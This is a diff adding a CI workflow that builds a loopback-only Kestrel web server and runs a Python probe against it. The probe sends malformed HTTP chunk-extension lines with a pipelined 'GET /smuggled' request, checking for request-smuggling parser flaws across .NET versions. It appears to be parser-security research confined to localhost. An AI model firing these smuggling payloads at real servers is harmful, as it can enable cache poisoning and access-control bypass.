@@ -1,0 +1,171 @@
+name: Kestrel chunk-extension lab
+
+on:
+  push:
+    branches:
+      - lab/kestrel-chunk-extensions-20260920
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - label: net10-10.0.12
+            sdk: 10.0.401
+            tfm: net10.0
+          - label: net11-rc1
+            sdk: 11.0.100-rc.1.26425.128
+            tfm: net11.0
+    runs-on: ubuntu-latest
+    name: ${{ matrix.label }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: ${{ matrix.sdk }}
+
+      - name: Build isolated localhost Kestrel harness
+        shell: bash
+        run: |
+          set -euxo pipefail
+          mkdir -p /tmp/kestrel-lab
+          cat >/tmp/kestrel-lab/Lab.csproj <<EOF
+          <Project Sdk="Microsoft.NET.Sdk.Web">
+            <PropertyGroup>
+              <TargetFramework>${{ matrix.tfm }}</TargetFramework>
+              <ImplicitUsings>enable</ImplicitUsings>
+              <Nullable>enable</Nullable>
+            </PropertyGroup>
+          </Project>
+          EOF
+          cat >/tmp/kestrel-lab/Program.cs <<'EOF'
+          using System.Text;
+
+          var builder = WebApplication.CreateBuilder(args);
+          builder.WebHost.ConfigureKestrel(o => o.ListenLocalhost(5005));
+          var app = builder.Build();
+
+          app.Run(async context =>
+          {
+              using var body = new MemoryStream();
+              await context.Request.Body.CopyToAsync(body);
+              var bytes = body.ToArray();
+              Console.WriteLine($"HIT method={context.Request.Method} path={context.Request.Path} bodyHex={Convert.ToHexString(bytes)}");
+              context.Response.ContentType = "text/plain";
+              await context.Response.WriteAsync($"{context.Request.Method} {context.Request.Path} body={Encoding.ASCII.GetString(bytes)}");
+          });
+
+          await app.RunAsync();
+          EOF
+          dotnet --info
+          dotnet build /tmp/kestrel-lab/Lab.csproj -c Release
+
+      - name: Run parser experiments over loopback only
+        shell: bash
+        run: |
+          set -euxo pipefail
+          cd /tmp/kestrel-lab
+          dotnet run --no-build -c Release --project Lab.csproj >server.log 2>&1 &
+          echo $! > server.pid
+          cleanup() { kill "$(cat server.pid)" 2>/dev/null || true; }
+          trap cleanup EXIT
+
+          for i in {1..50}; do
+            if curl -sS --max-time 1 http://127.0.0.1:5005/ready >/dev/null 2>&1; then break; fi
+            sleep 0.2
+          done
+
+          cat >probe.py <<'PY'
+          import json, socket, time
+
+          HOST, PORT = "127.0.0.1", 5005
+
+          cases = {
+              "valid_token": b'1;a=b\r\n',
+              "valid_quoted": b'1;a="b"\r\n',
+              "valid_quoted_pair": b'1;a="b\\\\c"\r\n',
+              "unclosed_quote": b'1;a="\r\n',
+              "missing_name": b'1;\r\n',
+              "missing_value": b'1;a=\r\n',
+              "multiple_semicolons": b'1;;;\r\n',
+              "nul_in_extension": b'1;\x00ext\r\n',
+              "invalid_value_at": b'1;a=@\r\n',
+              "bws_before_semicolon": b'1 ;a=b\r\n',
+              "bare_lf_extension": b'1;a=b\n',
+              "bare_cr_extension": b'1;a=b\rX\r\n',
+          }
+
+          def send_case(name, chunkline):
+              first = (
+                  b"POST /public HTTP/1.1\r\n"
+                  b"Host: localhost\r\n"
+                  b"Transfer-Encoding: chunked\r\n"
+                  b"\r\n"
+                  + chunkline
+                  + b"X\r\n"
+                  + b"0\r\n"
+                  + b"\r\n"
+              )
+              second = (
+                  b"GET /smuggled HTTP/1.1\r\n"
+                  b"Host: localhost\r\n"
+                  b"Connection: close\r\n"
+                  b"\r\n"
+              )
+              s = socket.create_connection((HOST, PORT), timeout=3)
+              s.settimeout(2)
+              s.sendall(first + second)
+              data = bytearray()
+              while True:
+                  try:
+                      part = s.recv(65536)
+                      if not part:
+                          break
+                      data.extend(part)
+                  except socket.timeout:
+                      break
+              s.close()
+              raw = bytes(data)
+              result = {
+                  "case": name,
+                  "chunkline_hex": chunkline.hex(),
+                  "http_responses": raw.count(b"HTTP/1.1 "),
+                  "statuses": [
+                      line.decode("latin1", "replace")
+                      for line in raw.split(b"\r\n")
+                      if line.startswith(b"HTTP/1.1 ")
+                  ],
+                  "contains_public_body": b"POST /public body=X" in raw,
+                  "contains_smuggled_body": b"GET /smuggled body=" in raw,
+                  "response_preview": raw[:800].decode("latin1", "replace"),
+              }
+              print(json.dumps(result, sort_keys=True))
+              return result
+
+          results = []
+          for name, line in cases.items():
+              results.append(send_case(name, line))
+              time.sleep(0.1)
+
+          with open("results.json", "w") as f:
+              json.dump(results, f, indent=2, sort_keys=True)
+          PY
+
+          python3 probe.py | tee probe.out
+          echo "=== SERVER LOG ==="
+          cat server.log
+
+      - name: Upload experiment results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: kestrel-chunk-extension-${{ matrix.label }}
+          path: |
+            /tmp/kestrel-lab/results.json
+            /tmp/kestrel-lab/probe.out
+            /tmp/kestrel-lab/server.log
